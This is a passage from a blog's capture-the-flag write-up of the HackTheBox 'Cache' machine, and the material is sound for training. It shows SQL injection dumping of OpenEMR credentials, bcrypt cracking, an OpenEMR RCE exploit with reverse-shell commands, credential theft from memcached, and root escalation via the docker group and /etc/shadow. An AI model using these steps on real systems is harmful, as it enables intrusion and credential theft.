</code></pre><p>Alternatively you can store the raw HTTP request in a file:</p><pre tabindex=0><code>GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1
Host: hms.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: OpenEMR=jcn4a7ce07kbngbo7r9rolttgu; PHPSESSID=fcfeq8h77phga1bs6b1cshh64e
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
</code></pre><p>And then tell sqlmap to use this req file:</p><pre tabindex=0><code>$ sqlmap -r &#34;$(pwd)/sqli.req&#34; --random-agent --threads 10 --batch -b
</code></pre><p>Now let&rsquo;s use sqlmap dump options.</p><p><code>--dbs</code></p><pre tabindex=0><code>available databases [2]:
[*] information_schema
[*] openemr
</code></pre><p><code>-D openemr --tables</code></p><pre tabindex=0><code>Database: openemr
[234 tables]
+---------------------------------------+
| array                                 |
| groups                                |
| sequences                             |
...
| user_settings                         |
| users                                 |
| users_facility                        |
| users_secure                          |
| valueset                              |
| voids                                 |
| x12_partners                          |
+---------------------------------------+
</code></pre><p><code>-D openemr -T users --columns</code></p><p><code>-D openemr -T users -C username,password --dump</code></p><pre tabindex=0><code>Database: openemr
Table: users
[3 entries]
+-----------------+--------------+
| username        | password     |
+-----------------+--------------+
| openemr_admin   | NoLongerUsed |
| phimail-service | NoLogin      |
| portal-user     | NoLogin      |
+-----------------+--------------+
</code></pre><p>It seems not to be the right table, lets&rsquo; try this one instead.</p><p><code>-D openemr -T users_secure -C username,password --dump</code></p><pre tabindex=0><code>Database: openemr
Table: users_secure
[1 entry]
+---------------+--------------------------------------------------------------+
| username      | password                                                     |
+---------------+--------------------------------------------------------------+
| openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. |
+---------------+--------------------------------------------------------------+
</code></pre><p>Let&rsquo;s put the hash in a file to crack it with [JtR][JtR]:</p><pre tabindex=0><code>$ printf %s &#39;$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.&#39; &gt; hash.txt
$ john -w /usr/share/wordlists/password/rockyou.txt --format=bcrypt hash.txt
Warning: invalid UTF-8 seen reading /usr/share/wordlists/password/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 2 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
xxxxxx           (?)
1g 0:00:00:01 DONE (2020-07-15 00:51) 0.6369g/s 722.2p/s 722.2c/s 722.2C/s water..zombie
Use the &#34;--show&#34; option to display all of the cracked passwords reliably
Session completed
$ john --show hash.txt
?:xxxxxx

1 password hash cracked, 0 left
</code></pre><p>Now we have some creds: <code>openemr_admin</code> / <code>xxxxxx</code>.</p><h3 id=http-exploitation-openemr-rce>HTTP exploitation (OpenEMR): RCE<a hidden class=anchor aria-hidden=true href=#http-exploitation-openemr-rce>#</a></h3><p>Now we will be able to use the authenticated RCE we found earlier.</p><p><strong>Warning</strong>: Using EDB-48515 that has a neutral impact rather than EDB-45161 that
will reset the config to default for everyone!!!</p><pre tabindex=0><code>$ searchsploit -m 48515
  Exploit: OpenEMR 5.0.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/48515
     Path: /usr/share/exploitdb/exploits/php/webapps/48515.py
File Type: ASCII text, with CRLF line terminators

Copied to: /home/cyfun/CTF/HackTheBox/machines/Cache/48515.py
</code></pre><p>Let&rsquo;s modify, the remote URL, the LHOST, LPORT, and admin creds.</p><p>Then start a listener & start the exploit:</p><pre tabindex=0><code>$ pwncat -l 8888 -vv
INFO: Listening on :::8888 (family 10/IPv6, TCP)
INFO: Listening on 0.0.0.0:8888 (family 2/IPv4, TCP)
INFO: Client connected from 10.10.10.188:32838 (family 2/IPv4, TCP)
Linux cache 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 23:11:40 up 32 min,  0 users,  load average: 0.07, 0.02, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can&#39;t access tty; job control turned off
$

$ python2 48515.py
[+] Authentication with credentials provided please be patient
[+] Uploading a payload it will take a minute
[+] You should be getting a shell
</code></pre><p>Afterward I created my own exploit for OpenEMR RCE: <a href=https://github.com/cyfun/OpenEMR-RCE>https://github.com/cyfun/OpenEMR-RCE</a></p><pre tabindex=0><code>$ ruby OpenEMR-RCE/exploit.rb auto -r http://hms.htb -u openemr_admin -p xxxxxx -h 10.10.15.201 -t 8888
$ ruby OpenEMR-RCE/exploit.rb semi-auto -r http://hms.htb -u openemr_admin -p xxxxxx -h 10.10.15.201 -t 8888 -m &#39;php/reverse_php&#39;
$ ruby OpenEMR-RCE/exploit.rb manual -r http://hms.htb -u openemr_admin -p xxxxxx -s tmp548.php
</code></pre><h3 id=privilege-escalation-of-machine--www-data-to-ash>Privilege Escalation of Machine : www-data to ash<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--www-data-to-ash>#</a></h3><p>We can use the credentials (<code>ash</code> / <code>H@v3_fun</code>) we found at the beginning.</p><pre tabindex=0><code>$ which python3
/usr/bin/python3
$ python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
www-data@cache:/$ su ash
su ash
Password: H@v3_fun

ash@cache:/$ cd
cd
ash@cache:~$ cat user.txt
cat user.txt
aebbdcd5e2a33812b7db84f42f124ea5
</code></pre><p>But this is totally optional it&rsquo;s possible to jump over this step and directly
elevate to user luffy from www-data.</p><h3 id=privilege-escalation-of-machine--ash-to-luffy>Privilege Escalation of Machine : ash to luffy<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--ash-to-luffy>#</a></h3><p>Let&rsquo;s see open TCP sockets:</p><pre tabindex=0><code>$ ss -nlpt
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*
LISTEN   0         128               127.0.0.1:11211            0.0.0.0:*
LISTEN   0         128                    [::]:22                  [::]:*
LISTEN   0         128                    [::]:11211               [::]:*
LISTEN   0         128                       *:80                     *:*
</code></pre><p>Ohoh we have port 11211 used by memcached.</p><p>We can confirm the process is running:</p><pre tabindex=0><code>$ ps -ef f | grep memcached
memcache  1125     1  0 22:39 ?        Ssl    0:00 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid
ash       6235  5474  0 23:30 pts/1    S+     0:00  |                           \_ grep --color=auto memcached
www-data  4693  4669  0 23:04 ?        Sl     0:00  |               \_ memcached
</code></pre><p>Let&rsquo;s check some advices on <a href=https://book.hacktricks.xyz/>HackTricks</a>: <a href=https://book.hacktricks.xyz/pentesting/11211-memcache>11211 - Pentesting Memcache</a></p><pre tabindex=0><code>$ telnet 127.0.0.1 11211
telnet 127.0.0.1 11211
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is &#39;^]&#39;.
version
version
VERSION 1.5.6 Ubuntu

stats items
stats items
STAT items:1:number 5
...

stats cachedump 1 0
stats cachedump 1 0
ITEM link [21 b; 0 s]
ITEM user [5 b; 0 s]
ITEM passwd [9 b; 0 s]
ITEM file [7 b; 0 s]
ITEM account [9 b; 0 s]
END

get user
get user
VALUE user 0 5
luffy
END

get passwd
get passwd
VALUE passwd 0 9
0n3_p1ec3
END

get file
get file
VALUE file 0 7
nothing
END

get account
get account
VALUE account 0 9
afhj556uo
END

quit
quit
</code></pre><p>Now we can use the creds: <code>luffy</code> / <code>0n3_p1ec3</code>.</p><pre tabindex=0><code>$ su luffy
su luffy
Password: 0n3_p1ec3

luffy@cache:/$ cd
cd
luffy@cache:~$
</code></pre><h3 id=privilege-escalation-of-machine--luffy-to-root>Privilege Escalation of Machine : luffy to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--luffy-to-root>#</a></h3><p>We can see there is docker running and the user is in docker group.</p><pre tabindex=0><code>$ id
uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
$ ps -ef f | grep docker
ps -ef f | grep docker
root       918     1  0 22:39 ?        Ssl    0:05 /usr/bin/dockerd -H fd://
root      1358   918  0 22:39 ?        Ssl    0:04  \_ containerd --config /var/run/docker/containerd/containerd.toml --log-level info
root      6934  1358  0 23:45 ?        Sl     0:00      \_ containerd-shim -namespace moby -workdir /var/lib/docker/containerd/daemon/io.containerd.runtime.v1.linux/moby/f211bc4cffb910b8c45b09d9eeec6c9483af4fff6222a5ca7c211aef6ca3bc94 -address /var/run/docker/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
</code></pre><p>Being in docker group is like being root because of the capabilities.</p><p>My reflex is to check <a href=https://gtfobins.github.io/>GTFOBins</a> if there are some ready to use payloads
for pe, and <a href=https://gtfobins.github.io/gtfobins/docker/#shell%3C%3E>there is</a>.</p><p>Let&rsquo;s find what images are available:</p><pre tabindex=0><code>$ docker images
docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              2ca708c1c9cc        10 months ago       64.2MB
</code></pre><p>So let&rsquo;s spawn a shell through a shared volume:</p><pre tabindex=0><code>luffy@cache:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
root@ae6411b77a1e:/# cd
cd
root@ae6411b77a1e:~# cat root.txt
cat root.txt
44f998eb5112e763883b6ae36279a432
root@ae6411b77a1e:~# cat /etc/shadow | grep root
cat /etc/shadow | grep root
root:$6$bWa.Lbnz$k0KbMyNbdOQRcY5pWuHM2bfkF5ek8c0CTNsi00qFHmp04NqcefCsIXZTdJgqToRar5zcEk5k8KFhbIomGB3Kb/:18178:0:99999:7:::
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/medium/>Medium</a></li></ul><nav class=paginav><a class=prev href=https://s4ch.github.io/writeups/hackthebox/blunder/><span class=title>« Prev</span><br><span>Blunder </span></a><a class=next href=https://s4ch.github.io/writeups/hackthebox/blackfield/><span class=title>Next »</span><br><span>Blackfield</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>